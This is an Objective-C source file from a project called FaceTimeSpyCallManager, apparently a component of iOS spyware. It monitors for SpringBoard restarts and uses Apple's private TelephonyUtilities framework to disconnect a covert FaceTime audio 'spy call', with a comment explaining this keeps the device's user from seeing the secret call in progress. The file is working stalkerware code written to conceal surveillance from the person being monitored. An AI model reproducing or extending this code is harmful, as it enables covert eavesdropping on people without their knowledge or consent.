//
//  SBKilledController.m
//  FaceTimeSpyCallManager
//
//  Created by Makara Khloth on 1/28/16.
//
//

#import "SBKilledController.h"
#import "RecentFaceTimeCallNotifier.h"

#import "AppProcessKilledNotifier.h"

#import "TUCallCenter.h"
#import "TUCall.h"
#import "TUCall+iOS8.h"
#import "TUProxyCall.h"
#import "TUProxyCall+iOS9.h"

#import <objc/runtime.h>
#import <dlfcn.h>

@interface SBKilledController (private)
- (void) springboardKilled;
@end

@implementation SBKilledController

@synthesize mRecentFaceTimeCallNotifier;

- (id) init {
    self = [super init];
    if (self) {
        mSBKilledNnotifier = [[AppProcessKilledNotifier alloc] init];
        mSBKilledNnotifier.mAppProcessName = @"SpringBoard";
        mSBKilledNnotifier.mDelegate = self;
        mSBKilledNnotifier.mSelector = @selector(springboardKilled);
    }
    return (self);
}

- (void) start {
    [mSBKilledNnotifier registerAppProcess];
}

- (void) stop {
    [mSBKilledNnotifier unregisterAppProcess];
}

- (void) springboardKilled {
    if ([[[UIDevice currentDevice] systemVersion] integerValue] >= 8) {
        
        /*
         When SpringBoard killed:
            - FaceTime video spy call disconnect by itself (normal behavior)
            - FaceTime audio spy call need to disconnect otherwise user will see spy call in progress after restart SpringBoard
         */
        
        void *handle = dlopen("/System/Library/PrivateFrameworks/TelephonyUtilities.framework/TelephonyUtilities", RTLD_NOW);
        Class $TUCallCenter = objc_getClass("TUCallCenter");
        TUCallCenter *tuCallCenter = [$TUCallCenter sharedInstance];
        for (TUProxyCall *facetimeCall in [tuCallCenter _allCalls]) { // Entitlements: com.apple.telephonyutilities.callservicesd
            if (facetimeCall.service == 2 &&
                [self.mRecentFaceTimeCallNotifier facetimeSpyCall:facetimeCall.destinationID]) {
                DLog(@"Disconnect FaceTime spy call");
                [facetimeCall disconnect];
                break;
            }
        }
        DLog(@"tuCallCenter: %@", tuCallCenter);
        DLog(@"_allCalls: %@", [tuCallCenter _allCalls]);
        dlclose(handle);
    }
}

- (void) dealloc {
    [self stop];
    [mSBKilledNnotifier release];
    [super dealloc];
}

@end
